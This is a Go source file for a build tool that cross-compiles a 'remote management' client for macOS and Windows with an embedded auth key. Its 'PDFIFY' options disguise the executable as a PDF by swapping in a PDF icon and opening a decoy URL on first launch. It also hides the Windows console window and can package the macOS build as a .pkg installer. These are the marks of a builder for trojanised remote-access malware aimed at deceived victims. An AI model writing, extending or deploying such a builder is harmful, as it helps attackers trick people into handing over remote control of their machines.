package builder

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

// BuildConfig holds the configuration for building a client
type BuildConfig struct {
	AuthKey        string
	TargetOS       string // "darwin" or "windows"
	TargetArch     string // "amd64" or "arm64"
	Version        string
	HostnamePrefix string
	OutputDir      string
	DecoyURL       string // PDFIFY: URL to open on first launch
	PDFIcon        bool   // PDFIFY: use PDF icon instead of default
	PackagePKG     bool   // macOS: wrap binary in a .pkg installer
}

// BuildResult contains the result of a build
type BuildResult struct {
	OutputPath string
	FileName   string
	Size       int64
	BuildTime  time.Duration
	Error      error
}

// BuildClient compiles the client binary with the auth key embedded
func BuildClient(cfg BuildConfig) BuildResult {
	startTime := time.Now()

	// Validate config
	if cfg.AuthKey == "" {
		return BuildResult{Error: fmt.Errorf("auth key is required")}
	}
	if cfg.TargetOS != "darwin" && cfg.TargetOS != "windows" {
		return BuildResult{Error: fmt.Errorf("target OS must be 'darwin' or 'windows'")}
	}
	if cfg.TargetArch == "" {
		cfg.TargetArch = "amd64"
	}
	if cfg.Version == "" {
		cfg.Version = "1.0.0"
	}
	if cfg.HostnamePrefix == "" {
		cfg.HostnamePrefix = "rmgmt"
	}

	// Determine output filename
	ext := ""
	if cfg.TargetOS == "windows" {
		ext = ".exe"
	}
	fileName := fmt.Sprintf("remote-mgmt-client-%s-%s%s", cfg.TargetOS, cfg.TargetArch, ext)
	outputPath := filepath.Join(cfg.OutputDir, fileName)

	// Build ldflags to inject variables at compile time
	buildTime := time.Now().UTC().Format(time.RFC3339)
	ldflags := fmt.Sprintf(
		"-s -w -X 'main.AuthKey=%s' -X 'main.Version=%s' -X 'main.BuildTime=%s' -X 'main.HostnamePrefix=%s'",
		cfg.AuthKey,
		cfg.Version,
		buildTime,
		cfg.HostnamePrefix,
	)

	// PDFIFY: embed decoy URL
	if cfg.DecoyURL != "" {
		ldflags += fmt.Sprintf(" -X 'main.DecoyURL=%s'", cfg.DecoyURL)
	}

	// For Windows, add -H windowsgui to hide the console window
	if cfg.TargetOS == "windows" {
		ldflags += " -H windowsgui"
	}

	// For Windows targets, generate version resource with go-winres
	clientPkg := "./cmd/client"
	if cfg.TargetOS == "windows" {
		if err := generateWindowsResource(cfg); err != nil {
			return BuildResult{Error: fmt.Errorf("resource generation failed: %v", err)}
		}
		defer cleanupWindowsResource()
	}

	// Build the binary
	cmd := exec.Command("go", "build",
		"-ldflags", ldflags,
		"-o", outputPath,
		clientPkg,
	)

	// Set environment for cross-compilation
	cmd.Env = append(os.Environ(),
		fmt.Sprintf("GOOS=%s", cfg.TargetOS),
		fmt.Sprintf("GOARCH=%s", cfg.TargetArch),
		"CGO_ENABLED=0", // Disable CGO for easier cross-compilation
	)

	output, err := cmd.CombinedOutput()
	if err != nil {
		return BuildResult{
			Error: fmt.Errorf("build failed: %v\nOutput: %s", err, string(output)),
		}
	}

	// Get file info
	info, err := os.Stat(outputPath)
	if err != nil {
		return BuildResult{Error: fmt.Errorf("failed to stat output: %v", err)}
	}

	// If macOS .pkg packaging is requested, wrap the binary
	if cfg.PackagePKG && cfg.TargetOS == "darwin" {
		pkgPath, err := BuildMacOSPkg(outputPath, cfg.OutputDir, cfg.Version)
		if err != nil {
			return BuildResult{Error: fmt.Errorf("pkg packaging failed: %v", err)}
		}
		// Clean up the raw binary — only the .pkg is needed
		os.Remove(outputPath)

		pkgInfo, err := os.Stat(pkgPath)
		if err != nil {
			return BuildResult{Error: fmt.Errorf("failed to stat pkg: %v", err)}
		}
		return BuildResult{
			OutputPath: pkgPath,
			FileName:   filepath.Base(pkgPath),
			Size:       pkgInfo.Size(),
			BuildTime:  time.Since(startTime),
		}
	}

	return BuildResult{
		OutputPath: outputPath,
		FileName:   fileName,
		Size:       info.Size(),
		BuildTime:  time.Since(startTime),
	}
}

// generateWindowsResource runs go-winres to create arch-specific .syso resource files
// with version info, manifest, and the appropriate icon (PDF or default)
func generateWindowsResource(cfg BuildConfig) error {
	// Resolve go-winres binary
	winresTool := "go-winres"
	if gopath := os.Getenv("GOPATH"); gopath != "" {
		candidate := filepath.Join(gopath, "bin", "go-winres")
		if _, err := os.Stat(candidate); err == nil {
			winresTool = candidate
		}
	} else if home, err := os.UserHomeDir(); err == nil {
		candidate := filepath.Join(home, "go", "bin", "go-winres")
		if _, err := os.Stat(candidate); err == nil {
			winresTool = candidate
		}
	}

	args := []string{"make", "--arch", cfg.TargetArch}

	// PDFIFY: override icon with PDF icon
	if cfg.PDFIcon {
		args = append(args, "--icon", "winres/pdf-icon.png")
	}

	cmd := exec.Command(winresTool, args...)
	cmd.Dir = filepath.Join("cmd", "client")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("go-winres: %v\nOutput: %s", err, string(output))
	}
	return nil
}

// cleanupWindowsResource removes the generated .syso files
func cleanupWindowsResource() {
	// go-winres generates arch-specific files like rsrc_windows_amd64.syso
	matches, _ := filepath.Glob(filepath.Join("cmd", "client", "rsrc_windows_*.syso"))
	for _, m := range matches {
		os.Remove(m)
	}
}

// SupportedTargets returns the list of supported OS/Arch combinations
func SupportedTargets() []struct {
	OS   string
	Arch string
	Name string
} {
	return []struct {
		OS   string
		Arch string
		Name string
	}{
		{"darwin", "amd64", "macOS (Intel)"},
		{"darwin", "arm64", "macOS (Apple Silicon)"},
		{"windows", "amd64", "Windows (64-bit)"},
		{"windows", "arm64", "Windows (ARM64)"},
	}
}
